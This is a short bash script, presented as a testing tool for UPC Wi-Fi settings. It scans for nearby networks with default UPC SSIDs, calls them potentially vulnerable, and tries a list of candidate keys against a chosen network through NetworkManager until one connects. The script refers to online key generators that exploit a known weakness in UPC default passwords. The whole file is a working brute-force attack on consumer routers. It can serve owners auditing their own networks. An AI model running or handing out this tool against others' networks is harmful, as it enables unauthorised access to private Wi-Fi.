#!/bin/bash -eu

# testing tool for UPC wifi settings
# expects: 
#  list of keys as input
#  numerical part of SSID as parameter

# see https://upc.michalspacek.cz/
# https://github.com/spaze/upc_keys-lambda
# https://github.com/skftn/upc_keys.py.git

timeout=10 #seconds

echo "Using NetworkManager to handle wifi key testing. Connection should already exist"

echo "Rescan"
nmcli -w 10 device wifi rescan
echo "Potentialy vulnerable networks, sorted by signal strength"
nmcli -t --fields signal,ssid d wifi | grep -E "UPC([[:digit:]]){6,7}$" | sort -rn 

SSID="UPC$1"
echo "connecting to $SSID"

while read key 
do
  echo "Trying $key"
  nmcli connection modify "$SSID" 802-11-wireless-security.psk "$key" 802-11-wireless-security.psk-flags 2
  if nmcli -w ${timeout} connection up "$SSID" 2>&1 | grep "Connection successfully activated" 
  then
    echo $SSID has key $key
    nmcli connection modify "$SSID" 802-11-wireless-security.psk-flags 2
    exit 0
  fi
done
echo "No key seems to match :(."
exit 2
